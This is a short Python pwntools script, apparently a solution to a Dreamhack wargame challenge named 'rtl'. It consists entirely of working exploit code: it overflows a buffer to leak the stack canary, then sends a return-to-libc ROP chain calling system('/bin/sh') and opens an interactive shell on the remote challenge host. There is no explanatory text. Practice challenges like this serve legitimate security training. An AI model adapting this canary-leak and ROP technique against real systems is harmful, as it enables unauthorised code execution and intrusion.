from pwn import *

r = remote("host8.dreamhack.games", 19294)
e = ELF('./rtl')

payload = b'A' * 0x39
r.sendafter(b"Buf: ", payload)
r.recvuntil(payload)
canary = b'\x00' + r.recvn(7)
pop_rdi = p64(0x400853)
binsh  = p64(0x400874)
system = p64(e.plt['system'])
ret = p64(0x0000000000400596)

payload = b'A' * 0x38 + canary + b'A' * 0x8 + ret + pop_rdi + binsh + system

r.sendafter(b"Buf: ", payload)
r.interactive()